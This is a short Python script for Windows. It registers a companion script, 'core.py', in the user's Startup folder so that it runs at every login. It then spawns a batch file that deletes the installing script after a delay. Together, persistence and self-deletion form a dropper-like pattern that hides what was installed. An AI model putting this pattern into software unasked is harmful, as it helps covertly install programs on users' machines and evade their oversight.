import os
import sys
import winshell
import subprocess

def add_to_startup(script_name):
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    script_path = os.path.abspath(script_name)
    shortcut_path = os.path.join(startup_folder, f"{script_name}.lnk")

    with winshell.shortcut(shortcut_path) as shortcut:
        shortcut.path = sys.executable
        shortcut.arguments = script_path
        shortcut.description = f"Startup script for {script_name}"
        shortcut.working_directory = os.path.dirname(script_path)
        shortcut.icon_location = (script_path, 0)

def schedule_self_deletion():
    # Path to the batch file that will delete this script
    batch_file_path = os.path.join(os.path.dirname(sys.argv[0]), 'delete_me.bat')

    # Create a batch file to delete startup.py after it finishes executing
    with open(batch_file_path, 'w') as batch_file:
        batch_file.write(f"@echo off\n")
        batch_file.write(f"ping 127.0.0.1 -n 3 >nul\n")  # Wait for 3 seconds
        batch_file.write(f"del \"{os.path.abspath(__file__)}\"\n")  # Delete the startup.py file

    # Run the batch file
    subprocess.Popen(batch_file_path, shell=True)

if __name__ == "__main__":
    # Path to the core.py script
    core_script_name = 'core.py'
    
    # Add core.py to startup
    add_to_startup(core_script_name)
    
    # Schedule deletion of this script
    schedule_self_deletion()
